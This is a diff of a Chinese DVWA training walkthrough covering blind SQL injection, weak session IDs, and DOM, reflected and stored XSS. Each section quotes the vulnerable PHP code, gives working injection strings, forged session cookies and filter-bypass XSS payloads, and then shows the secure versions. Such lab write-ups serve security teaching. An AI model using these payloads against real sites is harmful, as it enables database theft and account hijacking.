@@ -24,8 +24,8 @@
 - [新手指南：DVWA-1.9全级别教程之Insecure CAPTCHA](https://www.freebuf.com/articles/web/119692.html)
 - [新手指南：DVWA-1.9全级别教程之SQL Injection](https://www.freebuf.com/articles/web/120747.html)
 - [新手指南：DVWA-1.9全级别教程之SQL Injection(Blind)](https://www.freebuf.com/articles/web/120985.html)
-
-
+- [DVWA Weak Session IDs 通关教程](http://www.storysec.com/dvwa-weak-session-ids.html)
+- [DVWA XSS (DOM) 通关教程](http://www.storysec.com/dvwa-xss-dom.html)
 
 
 
@@ -2170,49 +2170,894 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 - **基于布尔的盲注**
 
     1. 判断是否存在注入，注入是字符型还是数字型
+		```
+        输入 1，显示相应用户存在
+        输入 1' and 1=1 # ，显示存在
+        输入 1' and 1=2 # ，显示不存在
+		```
+        说明存在字符型的 SQL 盲注。
 
-        输入`1`，显示相应用户存在
+	2. 猜解当前数据库名
 
-        输入`1' and 1=1 #`，显示存在
+		想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。
+		```
+	    输入 1' and length(database())=1 # ，显示不存在；
+	    输入 1' and length(database())=2 # ，显示不存在；
+	    输入 1' and length(database())=3 # ，显示不存在；
+    	输入 1' and length(database())=4 # ，显示存在：
+		```
+		说明数据库名长度为 4。
 
-        输入`1' and 1=2 #`，显示不存在
+		下面采用二分法猜解数据库名。
+		```
+		输入 1' and ascii(substr(database(),1,1))>97 # ，显示存在，说明数据库名的第一个字符的 ascii 值大于 97（小写字母 a 的 ascii 值）；
 
-        说明存在字符型的SQL盲注。
+		输入 1' and ascii(substr(database(),1,1))<122 # ，显示存在，说明数据库名的第一个字符的 ascii 值小于 122（小写字母 z 的 ascii 值）；
+
+		输入 1' and ascii(substr(database(),1,1))<109 # ，显示存在，说明数据库名的第一个字符的 ascii 值小于 109（小写字母 m 的 ascii 值）；
+
+		输入 1' and ascii(substr(database(),1,1))<103 # ，显示存在，说明数据库名的第一个字符的 ascii 值小于 103（小写字母 g 的 ascii 值）；
+
+		输入 1' and ascii(substr(database(),1,1))<100 # ，显示不存在，说明数据库名的第一个字符的 ascii 值不小于 100（小写字母 d 的 ascii 值）；
+
+		输入 1' and ascii(substr(database(),1,1))>100 # ，显示不存在，说明数据库名的第一个字符的 ascii 值不大于 100（小写字母 d 的 ascii 值），所以数据库名的第一个字符的 ascii 值为 100，即小写字母 d。
+		```
+		重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。
+
+	3. 猜解数据库中的表名
+
+		首先猜解数据库中表的数量：
+		```
+    	1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在
+
+    	1' and (select count(table_name) from information_schema.tables where table_schema=database())=2 # 显示存在
+		```
+		说明数据库中共有两个表
+
+		接着挨个猜解表名：
+		```
+		1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #
+
+		1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在
+
+		…
+
+		1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在
+		```
+		说明第一个表名长度为9。
+
+		```
+		1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 # 显示存在
+
+		1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<122 # 显示存在
+
+		1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<109 # 显示存在
+
+		1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<103 # 显示不存在
+
+		1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>103 # 显示不存在
+		```
+		说明第一个表的名字的第一个字符为小写字母g。
+
+		重复上述步骤，即可猜解出两个表名（guestbook、users）。
+
+	4. 猜解表中的字段名
+
+		首先猜解表中字段的数量：
+		```
+		1' and (select count(column_name) from information_schema.columns where table_name= 'users')=1 # 显示不存在
+
+		…
+
+		1' and (select count(column_name) from information_schema.columns where table_name= 'users')=8 # 显示存在
+		```
+		说明 users 表有 8 个字段。
+
+		接着挨个猜解字段名：
+		```
+	    1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=1 # 显示不存在
+
+    	…
+
+	    1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=7 # 显示存在
+		```
+		说明users表的第一个字段为7个字符长度。
+
+		采用二分法，即可猜解出所有字段名。
+
+	5. 猜解数据
+
+		同样采用二分法。
+		还可以使用基于时间的盲注：
+
+		1. 判断是否存在注入，注入是字符型还是数字型
+
+    		输入 `1' and sleep(2) #` ，感觉到明显延迟；
+
+    		输入 `1 and sleep(2) #` ，没有延迟；
+
+			说明存在字符型的基于时间的盲注。
+
+		2. 猜解当前数据库名
+
+			首先猜解数据名的长度：
+			```
+			1' and if(length(database())=1,sleep(2),1) # 没有延迟
+			1' and if(length(database())=2,sleep(2),1) # 没有延迟
+			1' and if(length(database())=3,sleep(2),1) # 没有延迟
+			1' and if(length(database())=4,sleep(2),1) # 明显延迟
+			```
+			说明数据库名长度为4个字符。
+
+			接着采用二分法猜解数据库名：
+			```
+			1' and if(ascii(substr(database(),1,1))>97,sleep(2),1)# 明显延迟
+			…
+			1' and if(ascii(substr(database(),1,1))<100,sleep(2),1)# 没有延迟
+			1' and if(ascii(substr(database(),1,1))>100,sleep(2),1)# 没有延迟
+			说明数据库名的第一个字符为小写字母d。
+    		…
+			```
+			重复上述步骤，即可猜解出数据库名。
+
+		3. 猜解数据库中的表名
+
+			首先猜解数据库中表的数量：
+			```
+			1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(2),1)# 没有延迟
+
+    		1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(2),1)# 明显延迟
+			```
+
+			说明数据库中有两个表。接着挨个猜解表名：
+			```
+		    1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(2),1) # 没有延迟
+    		…
+		    1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(2),1) # 明显延迟
+			```
+			说明第一个表名的长度为9个字符。
+			采用二分法即可猜解出表名。
+
+		4. 猜解表中的字段名
+
+			首先猜解表中字段的数量：
+			```
+		    1' and if((select count(column_name) from information_schema.columns where table_name= 'users')=1,sleep(2),1)# 没有延迟
+    		…
+		    1' and if((select count(column_name) from information_schema.columns where table_name= 'users')=8,sleep(2),1)# 明显延迟
+			```
+			说明users表中有8个字段。接着挨个猜解字段名
+			```
+		    1' and if(length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=1,sleep(2),1) # 没有延迟
+    		…
+		    1' and if(length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=7,sleep(2),1) # 明显延迟
+			```
+			说明users表的第一个字段长度为7个字符。
+			采用二分法即可猜解出各个字段名。
+
+		5. 猜解数据
+
+			同样采用二分法。
+
+### Medium
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Get input
+    $id = $_POST[ 'id' ];
+    $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Check database
+    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors
+
+    // Get results
+    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
+    if( $num > 0 ) {
+        // Feedback for end user
+        echo '<pre>User ID exists in the database.</pre>';
+    }
+    else {
+        // Feedback for end user
+        echo '<pre>User ID is MISSING from the database.</pre>';
+    }
+
+    //mysql_close();
+}
+
+?>
+```
+
+可以看到，Medium 级别的代码利用 mysql_real_escape_string 函数对特殊符号 ` \x00,\n,\r,\,’,”,\x1a` 进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。
+
+**漏洞利用**
+
+虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数id，提交恶意构造的查询参数。
+
+之前已经介绍了详细的盲注流程，这里就简要演示几个。
+
+- **首先是基于布尔的盲注**
+
+	抓包改参数 id 为 `1 and length(database())=4 #` ，显示存在，说明数据库名的长度为4个字符；
+
+	抓包改参数 id 为 `1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #` ，显示存在，说明数据中的第一个表名长度为9个字符；
+
+	抓包改参数 id 为 `1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #` ，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。
+
+- **然后是基于时间的盲注**
+
+	抓包改参数 id 为 `1 and if(length(database())=4,sleep(5),1) #` ，明显延迟，说明数据库名的长度为4个字符；
+
+	抓包改参数 id 为 `1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #` ，明显延迟，说明数据中的第一个表名长度为9个字符；
+
+	抓包改参数 id 为 `1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #` ，明显延迟，说明uers表有8个字段。
+
+### High
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_COOKIE[ 'id' ] ) ) {
+    // Get input
+    $id = $_COOKIE[ 'id' ];
+
+    // Check database
+    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors
+
+    // Get results
+    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
+    if( $num > 0 ) {
+        // Feedback for end user
+        echo '<pre>User ID exists in the database.</pre>';
+    }
+    else {
+        // Might sleep a random amount
+        if( rand( 0, 5 ) == 3 ) {
+            sleep( rand( 2, 4 ) );
+        }
+
+        // User wasn't found, so the page wasn't!
+        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
+
+        // Feedback for end user
+        echo '<pre>User ID is MISSING from the database.</pre>';
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?>
+```
+可以看到，High级别的代码利用 cookie 传递参数 id，当 SQL 查询结果为空时，会执行函数 sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL 查询语句中添加了 LIMIT 1，希望以此控制只输出一个结果。
+
+**漏洞利用**
+
+虽然添加了 LIMIT 1，但是我们可以通过 # 将其注释掉。但由于服务器端执行 sleep 函数，会使得基于时间盲注的准确性受到影响，这里我们只演示基于布尔的盲注：
+
+抓包将 cookie 中参数 id 改为 `1' and length(database())=4 #`，显示存在，说明数据库名的长度为4个字符；
+
+抓包将 cookie 中参数 id 改为 `1' and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #` ，显示存在，说明数据中的第一个表名长度为9个字符；
+
+抓包将 cookie 中参数 id 改为 `1' and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 #` ，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。
+
+### Impossible
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_GET[ 'Submit' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+    $id = $_GET[ 'id' ];
+
+    // Was a number entered?
+    if(is_numeric( $id )) {
+        // Check the database
+        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
+        $data->bindParam( ':id', $id, PDO::PARAM_INT );
+        $data->execute();
+
+        // Get results
+        if( $data->rowCount() == 1 ) {
+            // Feedback for end user
+            echo '<pre>User ID exists in the database.</pre>';
+        }
+        else {
+            // User wasn't found, so the page wasn't!
+            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
+
+            // Feedback for end user
+            echo '<pre>User ID is MISSING from the database.</pre>';
+        }
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?>
+```
+可以看到，Impossible 级别的代码采用了 PDO 技术，划清了代码与数据的界限，有效防御 SQL 注入，Anti-CSRF token 机制的加入了进一步提高了安全性。
+
+---
+
+## Weak Session IDs
+密码与证书等认证手段，一般仅仅用于登录(Login)的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时,都再使用密码认证一次。因此，当认证完成后，就需要替换一个对用户透明的凭证。这个凭证就是 SessionID。
+
+当用户登陆完成后，在服务器端就会创建一个新的会话(Session)，会话中会保存用户的状态和相关信息。服务器端维护所有在线用户的 Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个 Session，浏览器需要把当前用户持有的 SessionID 告知服务器。最常见的做法就是把 SessionID 加密后保存在 Cookie 中，因为 Cookie 会随着 HTTP 请求头发送，且受到浏览器同源策略的保护。
+
+SessionID 一旦在生命周期内被窃取，就等同于账户失窃。同时由于 SessionID 是用户登录之后才持有的认证凭证，因此黑客不需要再攻击登陆过程（比如密码）。Session 劫持就是一种通过窃取用户 SessionID 后，使用该 SessionID 登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效 Session。如果 SessionID 是保存在 Cookie 中的，则这种攻击可以称为 Cookie 劫持。SessionID 还可以保存在 URL 中，作为一个请求的一个参数，但是这种方式的安全性难以经受考验。
+
+因此，在生成 SessionID 时，需要保证足够的随机性，比如采用足够强的伪随机数生成算法。
+
+**SessionID 利用的实质**
+
+SessionID 是在登录后，作为特定用户访问站点所需的唯一内容。如果能够计算或轻易猜到该 SessionID，则攻击者将可以轻易获取访问权限，无需登录密码直接进入特定用户界面，进而查找其他漏洞如 XSS、文件上传等等。
+
+此模块使用四种不同的方式来设置 dvwaSession 的 cookie 值，每个级别的目标是计算 ID 的生成方式，然后推断其他管理员用户的 ID。
+
+### Low
+**服务器端核心代码**
+```php
+<?php
+
+$html = "";
+
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+    if (!isset ($_SESSION['last_session_id'])) {
+        $_SESSION['last_session_id'] = 0;
+    }
+    $_SESSION['last_session_id']++;
+    $cookie_value = $_SESSION['last_session_id'];
+    setcookie("dvwaSession", $cookie_value);
+}
+?>
+```
+可以看出，dvwaSession 是从 0 开始的，每次加 1。
+
+**漏洞利用**
+
+模拟管理员登录，在浏览器 1 里，点击 Generate，Burpsuite 抓包，发送到 Repeater，go 一次
+
+![image](../../../img/渗透/实验/dvwa58.png)
+
+请求头中：
+> Cookie: dvwaSession=17; security=low; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
+
+响应头中：
+> Set-Cookie: dvwaSession=18
+
+多 go 几次，发现 dvwaSession 一直增加，每次加 1。
+恶意攻击者通过寻找到上述规律，使用浏览器 2，成功构造出 payload:
+> Cookie: dvwaSession=18; security=low; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
+
+`注:这里的 cookie 值要根据你自己的 dvwaSession 去计算`
+
+在无密码认证的情况下，成功登陆到界面：
+`http://<IP地址!!!>/vulnerabilities/weak_id/`
+
+![image](../../../img/渗透/实验/dvwa59.png)
+
+### Medium
+**服务器端核心代码**
+```php
+<?php
+
+$html = "";
+
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+    $cookie_value = time();
+    setcookie("dvwaSession", $cookie_value);
+}
+?>
+```
+由代码可知，cookie 的值由时间而得
+
+**漏洞利用**
+
+模拟管理员登录，在浏览器 1 里，点击 Generate，burp 里发现：
+
+![image](../../../img/渗透/实验/dvwa60.png)
+
+请求头中：
+> Cookie: dvwaSession=19; security=medium; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
+
+响应头中：
+> Set-Cookie: dvwaSession=1561346895
+
+多 go 几次，发现 dvwaSession 和时间戳变化一致。在此，建议自行搜索 `unix时间戳`
+
+恶意攻击者通过寻找到上述规律，使用浏览器 2，成功构造出 payload:
+> Cookie: dvwaSession=1561347450; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2; security=medium
+
+`注:这里的 cookie 值要根据你自己的当前时间去算出来`
+
+在无密码认证的情况下，成功登陆到界面：
+`http://<IP地址!!!>/vulnerabilities/weak_id/`
+
+![image](../../../img/渗透/实验/dvwa61.png)
+
+
+### High
+**服务器端核心代码**
+```php
+<?php
+
+$html = "";
+
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+    if (!isset ($_SESSION['last_session_id_high'])) {
+        $_SESSION['last_session_id_high'] = 0;
+    }
+    $_SESSION['last_session_id_high']++;
+    $cookie_value = md5($_SESSION['last_session_id_high']);
+    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], false, false);
+}
+
+?>
+```
+
+- **PHP setcookie()函数**
+
+	`setcookie(name,value,expire,path,domain,secure,httponly)`
+
+	| 参数     | 描述                                       |
+	| :------- | :---------------------------------------- |
+	| name     | 必需。规定cookie的名称。                     |
+	| value    | 必需。规定cookie的值。                      |
+	| expire   | 可选。规定cookie的有效期。                   |
+	| path     | 可选。规定cookie的服务器路径。                |
+	| domain   | 可选。规定cookie的域名。                     |
+	| secure   | 可选。规定是否通过安全的HTTPS连接来传输cookie。 |
+	| httponly | 可选。规定是否Cookie仅可通过HTTP协议访问。     |
+
+	由源码可知：
+	```
+	value 值：last_session_id_high 自增 1，再用 md5 加密
+	expire 值：当前时间再加一个小时
+	path 值：/vulnerabilities/weak_id/
+	```
+
+**漏洞利用**
+
+模拟管理员登录，在浏览器 1 里，点击 Generate，burp 里发现：
+
+![image](../../../img/渗透/实验/dvwa62.png)
+
+请求头中：
+> Cookie: dvwaSession=19; security=high; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
+
+响应头中：
+> Set-Cookie: dvwaSession=c4ca4238a0b923820dcc509a6f75849b; expires=Mon, 24-Jun-2019 04:56:58 GMT;
+
+多 go 几次，发现 dvwaSession 值通过 MD5 加密。将每次产生的 MD5 解密，发现解密后的值，发现和低等级中的代码一样，是从 0 开始加的。
+
+恶意攻击者通过寻找到上述规律，使用浏览器 2，成功构造出 payload:
+> Cookie: dvwaSession=1F0E3DAD99908345F7439F8FFABDFFC4; security=high; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
+
+`注:这里的 cookie 值要根据你自己的 dvwaSession 去计算 md5`
+
+`http://<IP地址!!!>/vulnerabilities/weak_id/`
+
+![image](../../../img/渗透/实验/dvwa63.png)
+
+### Impossible
+**服务器端核心代码**
+```php
+<?php
+
+$html = "";
+
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+    $cookie_value = sha1(mt_rand() . time() . "Impossible");
+    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], true, true);
+}
+?>
+```
+$cookie_value 采用随机数+时间戳+固定字符串"Impossible"，再进行 sha1 运算，完全不能猜测到 dvwaSession 的值。实现了用户安全会话认证。
+
+---
+
+## XSS
+XSS，全称 Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS 不仅仅限于 JavaScript，还包括 flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS 可以分为存储型的XSS与反射型的XSS。
+
+DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。
+
+### XSS(DOM)
+DOM，全称 Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。
+
+DOM 型 XSS 其实是一种特殊类型的反射型 XSS，它是基于 DOM 文档对象模型的一种漏洞。
+
+在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的 Document object 文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过 DOM 来动态修改页面内容，从客户端获取 DOM 中的数据并在本地执行。基于这个特性，就可以利用 JS 脚本来实现 XSS 漏洞的利用。
+
+可能触发 DOM 型 XSS 的属性
+```
+document.referer 属性
+window.name 属性
+location 属性
+innerHTML 属性
+documen.write 属性
+```
+
+#### Low
+**服务器端核心代码**
+```php
+<?php
+
+# No protections, anything goes
+
+?>
+```
+简单直接，都告诉你了没有任何保护
+
+**漏洞利用**
+
+`http://<IP地址!!!>/vulnerabilities/xss_d/?default=English<script>alert(/xss/);</script>`
+
+![image](../../../img/渗透/实验/dvwa64.png)
+
+#### Medium
+**服务器端核心代码**
+```php
+<?php
+
+// Is there any input?
+if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
+    $default = $_GET['default'];
+
+    # Do not allow script tags
+    if (stripos ($default, "<script") !== false) {
+        header ("location: ?default=English");
+        exit;
+    }
+}
+
+?>
+```
+
+**相关函数介绍**
+
+array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。
+
+stripos() 函数查找字符串在另一字符串中第一次出现的位置
+
+**漏洞利用**
+
+这里就不用 `<script>` 换一种方法
+
+`http://<IP地址!!!>/vulnerabilities/xss_d/?default=English<input onfocus="alert('xss');" autofocus>`
+
+#### High
+**服务器端核心代码**
+```php
+<?php
+
+// Is there any input?
+if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
+
+    # White list the allowable languages
+    switch ($_GET['default']) {
+        case "French":
+        case "English":
+        case "German":
+        case "Spanish":
+            # ok
+            break;
+        default:
+            header ("location: ?default=English");
+            exit;
+    }
+}
+
+?>
+```
+
+这里采用了白名单，然而并没有什么鸟用
+
+**漏洞利用**
+
+`http://<IP地址!!!>/vulnerabilities/xss_d/?default=English #<script>alert(/xss/)</script>`
+
+#### Impossible
+**服务器端核心代码**
+```php
+<?php
+
+# Don't need to do anything, protction handled on the client side
+
+?>
+```
+
+---
+
+### XSS (Reflected)
+#### Low
+**服务器端核心代码**
+```php
+<?php
+
+header ("X-XSS-Protection: 0");
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Feedback for end user
+    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
+}
+
+?>
+```
+
+可以看到，代码直接引用了 name 参数，并没有任何的过滤与检查，存在明显的 XSS 漏洞。
+
+**漏洞利用**
+
+`<script>alert(/xss/)</script>` ，成功弹框：
+
+相应的XSS链接
+
+`http://<IP地址!!!>/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#`
+
+#### Medium
+**服务器端核心代码**
+```php
+<?php
+
+header ("X-XSS-Protection: 0");
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Get input
+    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
+
+    // Feedback for end user
+    echo "<pre>Hello ${name}</pre>";
+}
+
+?>
+```
+可以看到，这里对输入进行了过滤，基于黑名单的思想，使用 str_replace 函数将输入中的 <script> 删除，这种防护机制是可以被轻松绕过的。
+
+**漏洞利用**
+1. 双写绕过
+
+输入`<sc<script>ript>alert(/xss/)</script>`，成功弹框：
+
+相应的XSS链接：
+`http://<IP地址!!!>/dvwa/vulnerabilities/xss_r/?name=%3Csc%3Cscript%3Eript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#`
+
+2. 大小写混淆绕过
+
+输入`<ScRipt>alert(/xss/)</script>`，成功弹框：
+
+相应的XSS链接：
+`http://<IP地址!!!>/dvwa/vulnerabilities/xss_r/?name=%3CScRipt%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#`
+
+#### High
+**服务器端核心代码**
+```php
+<?php
+
+header ("X-XSS-Protection: 0");
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Get input
+    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
+
+    // Feedback for end user
+    echo "<pre>Hello ${name}</pre>";
+}
+
+?>
+```
+可以看到，High 级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中 i 表示不区分大小写）不再有效。
+
+**漏洞利用**
+
+虽然无法使用 `<script>` 标签注入 XSS 代码，但是可以通过 img、body 等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码。
+
+输入 `<img src=1 onerror=alert(/xss/)>` 或 `<input onfocus="alert('xss');" autofocus>` ，成功弹框
+
+#### Impossible
+**服务器端核心代码**
+```php
+<?php
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+    $name = htmlspecialchars( $_GET[ 'name' ] );
+
+    // Feedback for end user
+    echo "<pre>Hello ${name}</pre>";
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?>
+```
+可以看到，Impossible 级别的代码使用 htmlspecialchars 函数把预定义的字符 &、"、 '、<、> 转换为 HTML 实体，防止浏览器将其作为 HTML 元素。
+
+---
+
+### XSS (Stored)
+#### Low
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_POST[ 'btnSign' ] ) ) {
+    // Get input
+    $message = trim( $_POST[ 'mtxMessage' ] );
+    $name    = trim( $_POST[ 'txtName' ] );
+
+    // Sanitize message input
+    $message = stripslashes( $message );
+    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Sanitize name input
+    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Update database
+    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+    //mysql_close();
+}
+
+?>
+```
+可以看到，对输入并没有做 XSS 方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型 XSS 漏洞。
+
+**相关函数介绍**
+
+trim(string,charlist) 函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括 `、\t、\n、\x0B、\r` 以及空格，可选参数 charlist 支持添加额外需要删除的字符。
+
+mysql_real_escape_string(string,connection) 函数会对字符串中的特殊符号 `\x00，\n，\r，\，‘，“，\x1a` 进行转义。
+
+stripslashes(string) 函数删除字符串中的反斜杠。
+
+**漏洞利用**
+
+name 一栏前端有字数限制，可以直接修改前端代码，也可以抓包修改
+
+![image](../../../img/渗透/实验/dvwa65.png)
+
+message 一栏输入 `<script>alert(/xss/)</script>` ，成功弹框
+
+#### Medium
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_POST[ 'btnSign' ] ) ) {
+    // Get input
+    $message = trim( $_POST[ 'mtxMessage' ] );
+    $name    = trim( $_POST[ 'txtName' ] );
+
+    // Sanitize message input
+    $message = strip_tags( addslashes( $message ) );
+    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $message = htmlspecialchars( $message );
+
+    // Sanitize name input
+    $name = str_replace( '<script>', '', $name );
+    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Update database
+    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+    //mysql_close();
+}
+
+?>
+```
+
+**相关函数介绍**
+
+strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <b> 标签。
+
+addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。
+
+可以看到，由于对 message 参数使用了 htmlspecialchars 函数进行编码，因此无法再通过 message 参数注入 XSS 代码，但是对于 name 参数，只是简单过滤了 `<script>` 字符串，仍然存在存储型的XSS。
+
+**漏洞利用**
+
+1. 双写绕过
+
